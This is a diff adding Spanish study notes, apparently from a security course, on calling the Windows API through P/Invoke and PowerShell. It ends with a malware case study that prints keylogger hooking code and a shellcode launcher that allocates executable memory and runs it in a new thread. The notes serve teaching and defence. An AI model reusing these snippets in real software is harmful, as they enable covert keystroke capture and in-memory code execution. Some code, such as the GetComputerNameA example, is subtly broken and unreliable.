@@ -175,4 +175,133 @@ class Win32 {
 }
 ```
 
-La funcion de clase define la llamada de la API y definde una
+La funcion de clase define la llamada de la API y define la referencia para el futuro
+
+La libreria ocn la que se llama a la estructura de la API se gurada debe ser importada usando DllImport. La importación de DLLs es igual que las cabecera de los paquetes requiere imoprtar una DLL especifica con la que la API llamara. 
+
+Podemos crear un nuevo punto de aAPI de llamada para usando cuando queramos, definido por intPTR. 
+
+Ahora podemos implementar la definicion de la API dentro de la aplicacion y usar la funcionalidad.
+
+```
+class Win32 {
+	[DllImport("kernel32")]
+	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
+}
+
+static void Main(string[] args) {
+	bool success;
+	StringBuilder name = new StringBuilder(260);
+	uint size = 260;
+	success = GetComputerNameA(name, ref size);
+	Console.WriteLine(name.ToString());
+}
+```
+
+El programa debera devolver el nombre del ordenador.
+
+Ahora que sabemos como funciona en .NET vamos a ver como adoptarlo en PowerShell
+
+Definiendo la API identico a .NET, pero necesitaremos crear el meotdo de clases y añadir nuevos operadores
+
+```
+$MethodDefinition = @"
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@;
+```
+
+Las llamadas ahora estan definidas, pero PowerShell requiere otro paso antes de ser inicializado. Deberemoscrear un nuevo tipo de punto de Win32 con el metodo. La función Add-Type creara un archivo temporal en /emp y compilara las funciones necesarias usando csc.exe
+
+```
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+```
+
+# LLamadas comunmente abusadas por la API
+
+Varias llamadas API con la libreria Win32 que pueden ser aprovechadas para actividad maliciosa
+
+Varias entidades relacionadas con la documentación y organización estan todas disponibles en las llamadas API con vectores maliciosos
+
+Mientras muchas llamadas pueden ser abusadas
+
+Ejemplos
+
+![image](https://github.com/user-attachments/assets/2422714e-dff9-4f03-8cfe-24562b0ec317)
+
+# Malware Caso de Estudio
+
+Ahora que entendemos como implementar las liberias Win32 y llamadas que pueden ser abusadas, vamos a ver dos ejemplos de malware y obeservar como funciona
+
+## Keylogger
+
+PAra analizar un keylogger, necesitaremos recoger las llamadas de API e implementarla. Porque el keylogger esta escrito en C@, deberemos usar P/Invoke para obtener los puntos de llamada. Debajo veremos
+
+```
+[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+[return: MarshalAs(UnmanagedType.Bool)]
+private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+private static extern IntPtr GetModuleHandle(string lpModuleName);
+private static int WHKEYBOARDLL = 13;
+[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+private static extern IntPtr GetCurrentProcess();
+```
+
+Explicación de cada API
+
+![image](https://github.com/user-attachments/assets/4f457244-916e-4627-a606-1c4ff39c906c)
+
+PAra mantener una integridad etica en caso de estudio, nosotros debemos ver como recolecta los ejemplos. Nosotros deberemos analizar como los ejemplos funciona con el proceso correspondiente.
+
+```
+public static void Main() {
+	_hookID = SetHook(_proc);
+	Application.Run();
+	UnhookWindowsHookEx(_hookID);
+	Application.Exit();
+}
+private static IntPtr SetHook(LowLevelKeyboardProc proc) {
+	using (Process curProcess = Process.GetCurrentProcess()) {
+		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
+	}
+}
+```
+
+## Shellcode Launcher
+
+```
+private static UInt32 MEM_COMMIT = 0x1000;
+private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+[DllImport("kernel32")]
+private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+[DllImport("kernel32")]
+private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+[DllImport("kernel32")]
+private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+```
+
+![image](https://github.com/user-attachments/assets/ea80478c-f1c0-49c7-a723-d69ca6de2945)
+
+```
+UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+IntPtr hThread = IntPtr.Zero;
+UInt32 threadId = 0;
+IntPtr pinfo = IntPtr.Zero;
+hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+WaitForSingleObject(hThread, 0xFFFFFFFF);
+return;
+```
+
+
+
+
+
+
